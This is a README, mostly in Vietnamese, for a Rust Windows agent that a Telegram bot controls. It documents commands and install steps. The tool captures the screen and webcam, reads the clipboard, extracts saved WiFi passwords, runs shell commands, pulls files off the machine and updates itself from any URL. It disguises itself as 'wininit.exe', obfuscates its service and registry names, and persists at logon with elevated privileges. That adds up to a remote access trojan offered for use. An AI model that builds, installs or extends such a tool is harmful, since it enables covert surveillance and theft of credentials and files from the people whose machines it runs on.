# TG Remote Bot

Windows remote-control agent chạy qua Task Scheduler, điều khiển qua Telegram Bot API (long polling).

Kiến trúc: **1 máy = 1 bot token**. Super user gửi lệnh từ bất cứ đâu (DM, group).

## Tính năng

| Lệnh | Mô tả |
|------|--------|
| `/ping` | Pong + IP + uptime + version |
| `/status` | PID + uptime + job status |
| `/screenshot` | Chụp màn hình JPEG |
| `/camera` | Chụp webcam |
| `/sysinfo` | CPU, RAM, disk, network |
| `/clipboard` | Đọc clipboard |
| `/location` | Vị trí IP (đã định dạng) |
| `/netstat` | Danh sách network interfaces |
| `/wifi` | WiFi đã lưu + mật khẩu |
| `/wallpaper` | Lấy hình nền desktop |
| `/shell <cmd>` | Chạy lệnh shell (cmd /C) |
| `/cancel` | Hủy shell job đang chạy |
| `/listfiles <path>` | Liệt kê file trong thư mục |
| `/getfile <path>` | Tải file về (max 50MB) |
| `/procs` | Danh sách process |
| `/kill <pid>` | Kill process |
| `/run <path>` | Chạy chương trình |
| `/lock` | Khóa màn hình |
| `/mute` | Tắt âm hệ thống |
| `/unmute` | Bật âm hệ thống |
| `/volume <0-100>` | Chỉnh âm lượng hệ thống |
| `/msgbox <text>` | Hiện MessageBox (blocking) |
| `/shutdown` | Tắt máy (30s delay) |
| `/restart` | Khởi động lại (30s delay) |
| `/abortshutdown` | Hủy lệnh tắt máy |
| `/update [url]` | Cập nhật agent (không URL = auto-check GitHub) |
| `/uninstall` | Gỡ agent |
| `/stop` | Dừng daemon (Task Scheduler) |
| `/exit` | Tắt agent process |
| `/help` | Hiển thị trợ giúp |

## Cài đặt

### Yêu cầu

- Windows 10/11
- Rust (edition 2024)
- Telegram Bot Token (tạo qua [@BotFather](https://t.me/BotFather))
- Telegram User ID (lấy qua [@userinfobot](https://t.me/userinfobot))

### Build

```powershell
cargo build --release
```

### Chạy

#### Mode debug (foreground)

```powershell
cargo run -- --run <BOT_TOKEN> <USER_ID>
```

#### Cài đặt qua Task Scheduler (production)

Mở **Command Prompt** với quyền **Administrator**:

```powershell
.\target\release\wininit.exe --install <BOT_TOKEN> <USER_ID>
```

Task tự động chạy khi user đăng nhập (`/sc onlogon`), dưới quyền user hiện tại với highest privileges.

Cập nhật config:

```powershell
.\wininit.exe --reinstall <BOT_TOKEN> <USER_ID>
```

### CLI Arguments

| Argument | Mô tả |
|----------|--------|
| `--daemon` | Chạy daemon (Task Scheduler mode) |
| `--run TOKEN UID` | Chạy bot foreground (debug/test) |
| `--install TOKEN UID` | Cài Task Scheduler task (cần admin) |
| `--reinstall TOKEN UID` | Cập nhật registry config |
| `--uninstall` | Gỡ Task Scheduler task |
| `--help` | Hiển thị trợ giúp |

## Auto Update

Agent tự động kiểm tra version từ GitHub khi daemon start:

1. Fetch `tag_name` từ [GitHub Releases API](https://api.github.com/repos/cecon123/tg-remote-bot/releases/latest)
2. So sánh với `env!("CARGO_PKG_VERSION")` (semver)
3. Nếu mới hơn → download `wininit.exe` → rename exe cũ → swap binary → `process::exit(0)` → Task Scheduler restart

### Tạo release mới

```bash
# 1. Bump version trong Cargo.toml
# 2. Commit + push
git add -A && git commit -m "release: v1.3.0" && git push

# 3. Tag + push tag
git tag v1.3.0 && git push origin v1.3.0

# → GitHub Actions tự build + tạo release v1.3.0 với wininit.exe
# → Agent đang chạy sẽ tự update khi restart
```

### Manual update từ Telegram

```
/update                    # Auto-check GitHub, download nếu có version mới
/update <url>              # Download từ URL cụ thể
```

## Kiến trúc

```
┌─────────────────────────────────────────┐
│  Telegram User (DM/Group)               │
│  Gửi lệnh: /screenshot, /shell ls, ... │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  Telegram Bot API (Long Polling)        │
│  getUpdates → dispatch → reply          │
│  Exponential backoff retry              │
└─────────────┬───────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│  wininit.exe (user session)             │
│  ┌───────────────────────────────┐      │
│  │ Auth: check super_user_id    │      │
│  │ Rate Limit: token bucket     │      │
│  │ Router: dispatch to handler  │      │
│  └───────────┬───────────────────┘      │
│              │                           │
│  ┌───────────▼───────────────────┐      │
│  │ Command Handlers              │      │
│  │ screenshot, shell, sysinfo... │      │
│  └───────────┬───────────────────┘      │
│              │                           │
│  ┌───────────▼───────────────────┐      │
│  │ Windows APIs                  │      │
│  │ Win32, DPAPI, Registry        │      │
│  └───────────────────────────────┘      │
└─────────────────────────────────────────┘
```

## Cấu hình

Config được lưu trong Windows Registry, mã hóa qua DPAPI:

- **Registry path:** `HKLM\SOFTWARE\TgRemoteAgent` (obfuscated)
- **Keys:** `Token` (encrypted), `SuperUserId` (encrypted)

Config được set lần đầu qua `--install TOKEN UID` và có thể cập nhật qua `--reinstall TOKEN UID`.

## Task Scheduler

Task chạy dưới quyền **user hiện tại** (không phải SYSTEM) với `/rl highest`:

- **Trigger:** `/sc onlogon` — tự động chạy khi user đăng nhập
- **User:** `USERNAME` env variable tại thời điểm install
- **Privileges:** Highest (admin elevation)

Do chạy trong user session, tất cả lệnh desktop (screenshot, clipboard, camera, wallpaper, audio) đều hoạt động bình thường.

## Logging

Log files được ghi vào `{home}/logs/agent_YYYY-MM-DD.log` với daily rotation tự động.

- **Daemon mode:** Log vào file (không có console)
- **Foreground mode (`--run`):** Log ra file + stderr

Log format: `[2026-03-25 10:15:30] [INFO ] [module_path] message`

## Bảo mật

- **Auth:** Chỉ `super_user_id` mới có thể gửi lệnh
- **Rate limiting:** Token bucket per-command, chống spam
- **DPAPI:** Token lưu trong Registry được mã hóa qua Windows DPAPI
- **Mutex:** Chỉ 1 instance chạy trên mỗi máy (`CreateMutexA`)
- **Obfuscation:** Service name, registry path, install home được obfuscate bằng `obfstr`
- **Admin check:** `--install` yêu cầu quyền Administrator (HKLM write access)

## CI/CD

GitHub Actions workflows:

| Workflow | Trigger | Mô tả |
|----------|---------|--------|
| `ci.yml` | Push/PR to main | fmt check, clippy, test |
| `release.yml` | Tag push `v*` | Build release, create GitHub Release with `wininit.exe` |

## Phát triển

```powershell
# Lint
cargo clippy --all-targets -- -D warnings

# Format
cargo fmt --all

# Format check
cargo fmt --all -- --check

# Check types
cargo check

# Run tests
cargo test
```

## Cấu trúc dự án

```
src/
├── main.rs           # CLI, mutex check, admin check, daemon mode
├── bot/
│   ├── mod.rs        # AgentState, run_until() with retry loop
│   ├── auth.rs       # is_authorized()
│   ├── md.rs         # MarkdownV2 escape/send helpers, reply_error()
│   ├── router.rs     # Command enum, handler dispatch, ensure_authorized()
│   └── rate_limit.rs # Token bucket per-command rate limiter
├── commands/
│   ├── ping.rs       # PONG + IP + uptime + version
│   ├── status.rs     # PID + uptime + job status
│   ├── screenshot.rs # Screen capture → JPEG
│   ├── shell.rs      # cmd /C execution + /cancel
│   ├── sysinfo.rs    # CPU, RAM, disks, network
│   ├── system.rs     # lock, shutdown, restart, abort, run
│   ├── files.rs      # listfiles, getfile
│   ├── procs.rs      # procs, kill
│   ├── network.rs    # netstat
│   ├── clipboard.rs  # Read clipboard
│   ├── location.rs   # IP geolocation
│   ├── camera.rs     # Webcam capture
│   ├── wallpaper.rs  # Desktop wallpaper
│   ├── wifi.rs       # Saved WiFi + passwords
│   ├── audio.rs      # mute, unmute, volume (PowerShell)
│   └── msgbox.rs     # MessageBox Win32
├── security/
│   ├── dpapi.rs      # CryptProtectData / CryptUnprotectData
│   └── obfuscation.rs # obfstr! for sensitive strings
├── service/
│   ├── config.rs     # Registry config (DPAPI encrypted)
│   ├── install.rs    # Task Scheduler install/uninstall
│   ├── logging.rs    # DailyFile writer + init_logger()
│   └── scheduler.rs  # schtasks.exe wrappers
└── updater/
    └── self_update.rs # GitHub release check, download, swap
```

## Dependencies

| Crate | Purpose |
|-------|---------|
| teloxide 0.17 | Telegram Bot API framework |
| tokio 1.x | Async runtime (full features) |
| sysinfo 0.38 | System info (CPU, RAM, disk, network) |
| screenshots 0.8 | Screen capture |
| nokhwa 0.10 | Webcam capture |
| image 0.25 | Image processing (JPEG encoding) |
| reqwest 0.13 | HTTP client (GitHub API, geolocation) |
| serde_json 1.0 | JSON parsing |
| clipboard-win 5.4 | Clipboard access |
| windows-sys 0.61 | Win32 API bindings |
| winreg 0.56 | Windows Registry |
| obfstr 0.4 | String obfuscation |
| base64 0.22 | Base64 encoding (DPAPI) |
| fern 0.7 | File logging with daily rotation |
| chrono 0.4 | Timestamp for logs |
| anyhow 1.0 | Error handling |

## Changelog

### v1.3.0

**Architecture:**
- Task Scheduler now runs as current user (not SYSTEM) — all desktop commands work correctly after restart
- Removed `machine/session.rs` module (SYSTEM session delegation no longer needed)
- Removed dead `--screenshot`, `--camera`, `--clipboard`, `--wallpaper`, `--audio`, `--msgbox`, `--lock`, `--run-program` CLI subcommands

**Refactoring:**
- Extract `md::reply_error()` helper — reduces error reply boilerplate across all commands
- Extract `truncate_and_escape()` — DRY truncate+escape pattern used by shell, clipboard, files
- Add `md::MAX_MSG_BYTES` constant (3800) — replaces magic number in 5+ locations
- Add `md::send_document()` — centralized document sending with caption
- Move `fetch_github_update_url()` from `router.rs` to `updater::self_update::resolve_update_url()`
- Extract `check_rate_limit()` helper in router — reduces rate limit check duplication
- Extract `run_bot()` in main.rs — shared setup between `--daemon` and `--run`
- Remove `task_name()` wrapper in scheduler — use `obfuscation::service_name()` directly
- Make `setup_home_dir()` private in install.rs
- Remove unused `check_remote_version()` from updater

**Code quality:**
- Simplify `files.rs` — single metadata call instead of 3× `meta.as_ref()`
- Simplify `wifi.rs` — extract `parse_profile_name()` and `get_wifi_password()`
- Simplify `system.rs` — cleaner shutdown message selection
- Simplify `procs.rs` — use `let-else` for cleaner control flow
- Add `spawn_blocking` for screenshot/camera capture (CPU/GPU bound)
- Add doc comments on all public functions and key logic decisions
- Consistent handler naming in router (removed `_cmd` suffix)
- Fix `sysinfo` API change for 0.38 (`refresh_processes` now requires arguments)

**Bug fixes:**
- Fix screenshot/wallpaper/clipboard/audio failing after restart when running via Task Scheduler as SYSTEM

### v1.2.0

Previous stable release.

## License

Private project.
